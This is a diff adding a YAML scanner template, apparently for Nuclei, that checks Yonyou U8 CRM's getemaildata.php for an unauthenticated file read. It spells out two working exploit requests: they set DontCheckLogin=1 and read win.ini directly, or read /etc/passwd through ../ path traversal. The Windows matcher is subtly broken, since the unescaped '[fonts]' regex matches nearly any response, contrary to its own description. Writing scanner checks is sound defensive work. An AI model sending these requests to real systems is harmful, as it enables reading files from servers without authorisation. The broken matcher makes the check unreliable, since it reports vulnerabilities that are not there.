@@ -1,0 +1,40 @@
+id: scopesentry-yongyou-u8crm-fileread
+
+info:
+  name: Yonyou U8 CRM getemaildata.php Unauthenticated File Read
+  author: scopesentry
+  severity: high
+  description: |
+    用友 U8 CRM /ajax/getemaildata.php 在 DontCheckLogin=1 时按 filePath 读文件。
+    判据：Windows 读到 win.ini 的 [fonts] 段，或 Linux 读到 /etc/passwd 的 root 行；两路任一成立即确认。
+  tags: yonyou,u8,crm,lfi,file-read
+  metadata:
+    verified: false
+    max-request: 2
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini'
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '(?i)[fonts]'
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - '{{BaseURL}}/ajax/getemaildata.php?DontCheckLogin=1&filePath=../../../../../../../../etc/passwd'
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+      - type: status
+        status:
+          - 200
